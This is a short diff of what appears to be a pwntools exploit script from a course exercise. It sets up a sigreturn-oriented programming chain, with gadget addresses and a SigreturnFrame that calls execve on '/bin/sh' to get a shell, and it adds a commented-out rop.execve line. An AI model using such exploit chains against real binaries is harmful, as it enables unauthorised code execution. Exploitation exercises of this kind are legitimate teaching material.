@@ -31,6 +31,10 @@ pop_rax_gadget = 0x00000000004010b3 # pop rax; ret;
 syscall_gadget = 0x0000000000401010 # syscall;
 
 # first we execute the syscall "SIGRETURN" (15) to setup the 4 register, then we just return to syscall again to get a shell :)
+
+# rop.execve(next(binary.search('/bin/sh'), 0, 0))
+# one more line, see slides exercise 3
+
 frame = pwn.SigreturnFrame()
 frame.rax = 59
 frame.rdi = shell_string
